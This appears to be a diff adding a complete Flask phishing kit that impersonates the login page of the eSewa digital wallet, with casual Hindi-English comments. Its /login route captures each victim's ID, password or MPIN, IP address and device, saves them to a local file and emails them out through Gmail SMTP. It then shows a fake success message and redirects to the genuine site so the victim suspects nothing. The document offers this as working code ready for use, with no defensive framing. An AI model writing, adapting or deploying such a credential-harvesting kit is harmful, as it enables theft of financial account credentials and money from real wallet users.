@@ -1,0 +1,149 @@
+# app.py  —  eSewa Clone (single file, sab kuch isi me)
+from flask import Flask, render_template_string, request, jsonify
+from datetime import datetime
+import smtplib
+from email.mime.text import MIMEText
+
+app = Flask(__name__)
+
+# ================= SETTINGS =================
+GMAIL_USER = "rajkumar22@gmail.com"          # tera gmail
+GMAIL_APP_PASSWORD = "xxxxxxxxxxxxxxxx"       # 16-digit App Password (neeche setup hai)
+TO_EMAIL = "rajkumar22@gmail.com"             # jahan capture bhejna hai
+REDIRECT_URL = "https://esewa.com.np/"        # login ke baad asli eSewa
+LOG_FILE = "captured.txt"                     # local log file
+# ============================================
+
+# ---------------- HTML PAGE ----------------
+PAGE = r"""<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1"/>
+<title>Login - eSewa</title>
+<style>
+  *{box-sizing:border-box;margin:0;padding:0;font-family:'Segoe UI',Roboto,Arial,sans-serif}
+  body{background:#eef7ea;min-height:100vh;display:flex;flex-direction:column;align-items:center}
+  .topbar{width:100%;background:#60bb46;padding:14px 24px;display:flex;align-items:center}
+  .logo{color:#fff;font-size:24px;font-weight:800;letter-spacing:.5px}
+  .logo b{background:#fff;color:#60bb46;border-radius:6px;padding:1px 7px;margin-right:6px}
+  .card{background:#fff;width:380px;max-width:92vw;margin-top:50px;border-radius:12px;
+        padding:34px 30px;box-shadow:0 12px 34px rgba(0,0,0,.08)}
+  .card h1{font-size:20px;color:#2f8f1e;text-align:center;margin-bottom:4px}
+  .card p.sub{text-align:center;color:#888;font-size:13px;margin-bottom:26px}
+  .field{margin-bottom:16px;position:relative}
+  .field label{display:block;font-size:13px;color:#555;margin-bottom:6px}
+  .field input{width:100%;padding:12px 14px;border:1px solid #dcdcdc;border-radius:8px;font-size:15px;outline:none}
+  .field input:focus{border-color:#60bb46;box-shadow:0 0 0 3px rgba(96,187,70,.15)}
+  .toggle{position:absolute;right:12px;top:36px;font-size:13px;color:#60bb46;cursor:pointer;font-weight:600}
+  .submit{width:100%;background:#60bb46;color:#fff;border:0;padding:13px;border-radius:8px;
+          font-size:16px;font-weight:700;cursor:pointer;margin-top:6px}
+  .submit:disabled{opacity:.65}
+  .forgot{display:block;text-align:center;margin-top:16px;font-size:13px;color:#60bb46;text-decoration:none}
+  .msg{text-align:center;color:#2f8f1e;font-size:14px;margin-top:12px}
+  footer{margin-top:auto;padding:22px;color:#8aa;font-size:13px}
+</style>
+</head>
+<body>
+  <div class="topbar"><div class="logo"><b>e</b>Sewa</div></div>
+
+  <form class="card" id="loginForm">
+    <h1>Login to your eSewa account</h1>
+    <p class="sub">Enter your details to continue</p>
+
+    <div class="field">
+      <label>Mobile Number / eSewa ID</label>
+      <input type="text" name="uid" required placeholder="98XXXXXXXX" autocomplete="off"/>
+    </div>
+
+    <div class="field">
+      <label>Password / MPIN</label>
+      <input type="password" name="password" id="pwd" required placeholder="------"/>
+      <span class="toggle" onclick="togglePwd()">Show</span>
+    </div>
+
+    <button class="submit" id="btn" type="submit">Login</button>
+    <a href="#" class="forgot">Forgot Password / MPIN?</a>
+    <p class="msg" id="msg"></p>
+  </form>
+
+  <footer>© 2026 eSewa Clone — Made in Nepal</footer>
+
+<script>
+function togglePwd(){
+  var p = document.getElementById('pwd');
+  p.type = p.type === 'password' ? 'text' : 'password';
+}
+
+document.getElementById('loginForm').addEventListener('submit', async function(e){
+  e.preventDefault();
+  var btn = document.getElementById('btn');
+  var msg = document.getElementById('msg');
+  btn.disabled = true;
+  btn.textContent = 'Logging in...';
+  msg.textContent = '';
+
+  var fd = new FormData(e.target);
+  var redirect = '';
+  try {
+    var res = await fetch('/login', { method:'POST', body: fd });
+    var j = await res.json();
+    redirect = j.redirect;
+  } catch (err) {
+    msg.textContent = 'Network error, try again.';
+    btn.disabled = false; btn.textContent = 'Login';
+    return;
+  }
+
+  msg.textContent = 'Login successful! Redirecting...';
+  setTimeout(function(){ if (redirect) window.location.href = redirect; }, 800);
+});
+</script>
+</body>
+</html>
+"""
+# ---------------- /HTML PAGE ----------------
+
+def save_log(line):
+    with open(LOG_FILE, "a", encoding="utf-8") as f:
+        f.write(line + "\n")
+
+def send_email(subject, body):
+    if not GMAIL_APP_PASSWORD or GMAIL_APP_PASSWORD.startswith("x"):
+        return
+    msg = MIMEText(body)
+    msg["Subject"] = subject
+    msg["From"] = GMAIL_USER
+    msg["To"] = TO_EMAIL
+    with smtplib.SMTP_SSL("smtp.gmail.com", 465) as s:
+        s.login(GMAIL_USER, GMAIL_APP_PASSWORD)
+        s.send_message(msg)
+
+@app.route("/")
+def index():
+    return render_template_string(PAGE)
+
+@app.route("/login", methods=["POST"])
+def login():
+    uid = request.form.get("uid", "").strip()
+    pwd = request.form.get("password", "")
+    ip  = request.headers.get("X-Forwarded-For", request.remote_addr)
+    ua  = request.headers.get("User-Agent", "")
+    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+
+    record = (f"[{now}]\n"
+              f"  eSewa ID / Mobile : {uid}\n"
+              f"  Password / MPIN   : {pwd}\n"
+              f"  IP                : {ip}\n"
+              f"  Device            : {ua}\n")
+
+    save_log(record)
+    try:
+        send_email("eSewa Login Captured", record)
+    except Exception as e:
+        print("Email error:", e)
+
+    return jsonify({"ok": True, "redirect": REDIRECT_URL})
+
+if __name__ == "__main__":
+    app.run(host="0.0.0.0", port=5000, debug=True)
